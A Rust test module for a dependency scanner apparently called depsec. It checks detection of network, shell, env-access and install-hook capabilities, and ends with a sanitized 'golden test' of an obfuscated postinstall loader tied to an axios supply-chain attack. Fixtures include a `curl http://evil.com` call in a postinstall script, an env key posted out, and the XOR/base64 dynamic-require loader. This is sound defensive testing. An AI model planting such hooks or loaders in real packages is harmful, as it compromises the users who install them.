    #[test]
    fn test_ruby_fs_write() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_ruby("File.write('out.txt', data)", &mut caps);
        assert!(caps.fs_write, "Should detect fs write from File.write");
    }

    // --- Rust capability detection ---

    #[test]
    fn test_rust_network_reqwest() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_rust("use reqwest;\nreqwest::get(url).await?;", &mut caps);
        assert!(caps.network, "Should detect network from reqwest");
    }

    #[test]
    fn test_rust_network_std_net() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_rust("use std::net::TcpStream;", &mut caps);
        assert!(caps.network, "Should detect network from std::net");
    }

    #[test]
    fn test_rust_shell_command() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_rust(
            "Command::new(\"sh\").arg(\"-c\").arg(cmd).output()?;",
            &mut caps,
        );
        assert!(
            caps.shell_exec,
            "Should detect shell exec from Command::new"
        );
    }

    #[test]
    fn test_rust_env_access() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_rust("let key = std::env::var(\"API_KEY\")?;", &mut caps);
        assert!(caps.env_access, "Should detect env access from std::env");
    }

    #[test]
    fn test_rust_fs_read() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_rust("let data = std::fs::read(\"file.txt\")?;", &mut caps);
        assert!(caps.fs_read, "Should detect fs read from std::fs::read");
    }

    #[test]
    fn test_rust_fs_write() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_rust("std::fs::write(\"out.txt\", data)?;", &mut caps);
        assert!(caps.fs_write, "Should detect fs write from std::fs::write");
    }

    #[test]
    fn test_rust_dynamic_load() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_rust("use libloading::Library;", &mut caps);
        assert!(
            caps.dynamic_load,
            "Should detect dynamic loading from libloading"
        );
    }

    // --- Multi-language integration: scan_package ---

    #[test]
    fn test_scan_package_python() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("evil-py-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("__init__.py"),
            "import requests\nimport os\nrequests.post(os.environ['API_KEY'])",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(
            caps.network,
            "Python package should have network capability"
        );
        assert!(caps.env_access, "Python package should have env access");
    }

    #[test]
    fn test_scan_package_ruby() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("evil-rb-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("lib.rb"),
            "require 'net/http'\nsystem(ENV['CMD'])",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(caps.network, "Ruby package should have network capability");
        assert!(caps.shell_exec, "Ruby package should have shell exec");
        assert!(caps.env_access, "Ruby package should have env access");
    }

    #[test]
    fn test_scan_package_rust() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("evil-rs-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("main.rs"),
            "use reqwest;\nuse std::env;\nlet key = env::var(\"SECRET\")?;",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(caps.network, "Rust package should have network capability");
        assert!(caps.env_access, "Rust package should have env access");
    }

    #[test]
    fn test_scan_package_python_install_hook() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("hooked-py");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("setup.py"),
            "from setuptools import setup\nsetup(cmdclass={'install': Evil})",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(
            caps.install_hook,
            "Python setup.py with cmdclass = install hook"
        );
    }

    #[test]
    fn test_scan_package_rust_build_rs() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("build-rs-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("build.rs"),
            "fn main() { /* compile C code */ }",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(caps.install_hook, "Rust build.rs = install hook");
    }

    // Integration test with real package scanning
    #[test]
    fn test_scan_package_clean() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("clean-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"clean-pkg","version":"1.0.0"}"#,
        )
        .unwrap();
        std::fs::write(
            pkg_dir.join("index.js"),
            "module.exports = function() { return 42; };",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(!caps.has_any(), "Clean package should have no capabilities");
    }

    #[test]
    fn test_scan_package_with_network() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("net-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"net-pkg","version":"1.0.0"}"#,
        )
        .unwrap();
        std::fs::write(
            pkg_dir.join("index.js"),
            "const http = require('http');\nhttp.get('http://example.com');",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(caps.network);
        assert!(!caps.shell_exec);
    }

    #[test]
    fn test_scan_package_with_install_hook() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("hook-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"hook-pkg","scripts":{"postinstall":"node setup.js"}}"#,
        )
        .unwrap();
        std::fs::write(
            pkg_dir.join("setup.js"),
            "const cp = require('child_process');\ncp.execSync('curl http://evil.com');",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(caps.install_hook);
        assert!(caps.shell_exec);
    }

    #[test]
    fn test_full_check_run() {
        let dir = tempfile::TempDir::new().unwrap();
        let nm = dir.path().join("node_modules/evil-pkg");
        std::fs::create_dir_all(&nm).unwrap();
        std::fs::write(
            nm.join("package.json"),
            r#"{"name":"evil-pkg","scripts":{"postinstall":"node setup.js"}}"#,
        )
        .unwrap();
        std::fs::write(
            nm.join("index.js"),
            "const http = require('http');\nconst cp = require('child_process');\ncp.exec(cmd);",
        )
        .unwrap();

        let config = crate::config::Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = CapabilitiesCheck.run(&ctx).unwrap();
        assert!(
            !result.findings.is_empty(),
            "Should find dangerous capability combinations"
        );
        // Should detect dropper (network + exec) and install-exec (hook + exec) and install-network (hook + network)
        assert!(result
            .findings
            .iter()
            .any(|f| f.rule_id.contains("dropper") || f.rule_id.contains("install")));
    }

    // =========================================================================
    // GOLDEN TEST: axios/plain-crypto-js supply chain attack (sanitized)
    //
    // This test recreates the ACTUAL structure of the 2026-03-31 axios attack
    // where plain-crypto-js@4.2.1 was injected as a dependency. The payload:
    // - Uses 2-layer obfuscation (XOR + reversed base64)
    // - Dynamically loads fs, os, child_process via require(decode(...))
    // - Destructures execSync as F, calls F(s)
    // - Self-deletes setup.js and replaces package.json
    // - Has a postinstall hook
    //
    // All network calls, file writes, and exec calls are INERT in this test.
    // The test verifies that depsec's detection pipeline catches the attack.
    // =========================================================================

    /// The sanitized payload mimicking plain-crypto-js setup.js
    const AXIOS_PAYLOAD: &str = r#"
// Sanitized version of plain-crypto-js@4.2.1 setup.js
// Original: https://socket.dev/blog/axios-npm-package-compromised
// All dangerous calls replaced with inert equivalents for testing.

const stq = [
    "_kLx+SMgE7Kx1S8vE3LxSSCqEHKxjScp7Kx_gvELKx_gvEvKx",
    "_oaxtWcrF3axHMqEnLxhSMrEvIxqWcoF3bxtWcoF_axsSof3axvMqFxIlxZSMjEJ3xsSCm",
    "_iWSuF3bx9WctFDbxgSsoE7KxjWspEvKchSsrE_LxsSsvELaxiW8tF3Lx+ScuEXKx",
    "_wVF7bxkSMpErLx_jSMpErLx4SMrEnKx"
];

const_trans_1 = function(x, r) {
    try {
        const E = r.split("").map(Number);
        return x.split("").map((k, r) => {
            const S = x.charCodeAt(r);
            a = E[7 * r * r % 10];
            return String.fromCharCode(S ^ a ^ 333);
        }).join("");
    } catch {}
};

_trans_2 = function(x, r) {
    try {
        let E = x.split("").reverse().join("").replaceAll("_", "=");
        S = Buffer.from(E, "base64").toString("utf8");
        return _trans_1(S, r);
    } catch {}
};

ord = "OrDeR_7077";

_entry = function(x) {
    try {
        let r = 4027,
            E = (r.toString().charCodeAt(2), String.fromCharCode(S ^ a ^ 333)),
            t = require(_trans_2(stq[2], ord)),
            W = require(_trans_2(stq[1], ord)),
            {
                execSync: F
            } = require(_trans_2(stq[0], ord));

        // SANITIZED: Original code stages payloads and executes them.
        // Replaced with inert variable assignments for testing.
        var o = W.platform(),
            e = W.tmpdir(),
            q = "test_payload",
            n = "test_artifact";

        // SANITIZED: Original deletes setup.js and renames package.md
        t.unlinkSync(__filename);
        // t.renameSync('package.md', 'package.json');
    } catch {}
};
"#;

    #[test]
    fn test_axios_attack_full_pipeline_patterns() {
        // Test the patterns check catches the axios payload
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/plain-crypto-js");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(pkg_dir.join("setup.js"), AXIOS_PAYLOAD).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"plain-crypto-js","version":"4.2.1","scripts":{"postinstall":"node setup.js"}}"#,
        )
        .unwrap();

        let config = crate::config::Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = crate::checks::patterns::PatternsCheck.run(&ctx).unwrap();

        // Collect all rule IDs that fired
        let rule_ids: Vec<&str> = result.findings.iter().map(|f| f.rule_id.as_str()).collect();

        // P013: Dynamic require() — the killer signal
        assert!(
            rule_ids.iter().any(|r| *r == "DEPSEC-P013"),
            "P013 (dynamic require) should fire on require(_trans_2(...)). Got: {:?}",
            rule_ids
        );

        // P014: String deobfuscation (fromCharCode + XOR)
        assert!(
            rule_ids.iter().any(|r| *r == "DEPSEC-P014"),
            "P014 (deobfuscation) should fire on String.fromCharCode(S ^ a ^ 333). Got: {:?}",
            rule_ids
        );

        // P015: Anti-forensic self-deletion
        assert!(
            rule_ids.iter().any(|r| *r == "DEPSEC-P015"),
            "P015 (anti-forensic) should fire on unlinkSync(__filename). Got: {:?}",
            rule_ids
        );

        // P016: Dependency install script
        assert!(
            rule_ids.iter().any(|r| *r == "DEPSEC-P016"),
            "P016 (dep install script) should fire on postinstall hook. Got: {:?}",
            rule_ids
        );

        // P013 should be ESCALATED due to signal combination with P014
        let escalated = result
            .findings
            .iter()
            .any(|f| f.rule_id == "DEPSEC-P013" && f.message.contains("ESCALATED"));
        assert!(
            escalated,
            "P013 should be ESCALATED when combined with obfuscation signals. Got: {:?}",
            result
                .findings
                .iter()
                .filter(|f| f.rule_id == "DEPSEC-P013")
                .map(|f| &f.message)
                .collect::<Vec<_>>()
        );

        // Verify severity — P013 escalated should be Critical
        let critical_p013 = result
            .findings
            .iter()
            .filter(|f| f.rule_id == "DEPSEC-P013" && f.severity == Severity::Critical)
            .count();
        assert!(
            critical_p013 >= 1,
            "At least one P013 should be Critical severity"
        );

        println!(
            "\n=== AXIOS GOLDEN TEST (patterns) ===\nFindings: {} total",
            result.findings.len()
        );
        for f in &result.findings {
            println!(
                "  [{}] {} — {}",
                f.severity,
                f.rule_id,
                f.message.lines().next().unwrap_or("")
            );
        }
    }

    #[test]
    fn test_axios_attack_full_pipeline_capabilities() {
        // Test the capabilities check catches the axios payload
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/plain-crypto-js");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(pkg_dir.join("setup.js"), AXIOS_PAYLOAD).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"plain-crypto-js","version":"4.2.1","scripts":{"postinstall":"node setup.js"}}"#,
        )
        .unwrap();

        let config = crate::config::Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = CapabilitiesCheck.run(&ctx).unwrap();

        // Should detect capabilities
        assert!(
            !result.findings.is_empty(),
            "Capabilities check should flag the axios payload. Got 0 findings."
        );

        let rule_ids: Vec<&str> = result.findings.iter().map(|f| f.rule_id.as_str()).collect();

        // Should detect obfuscated-dynamic combo (C8 + C9)
        assert!(
            rule_ids.iter().any(|r| r.contains("obfuscated")
                || r.contains("dynamic")
                || r.contains("install")),
            "Should detect dangerous capability combination. Got: {:?}",
            rule_ids
        );

        println!(
            "\n=== AXIOS GOLDEN TEST (capabilities) ===\nFindings: {} total",
            result.findings.len()
        );
        for f in &result.findings {
            println!(
                "  [{}] {} — {}",
                f.severity,
                f.rule_id,
                f.message.lines().next().unwrap_or("")
            );
        }
    }
}
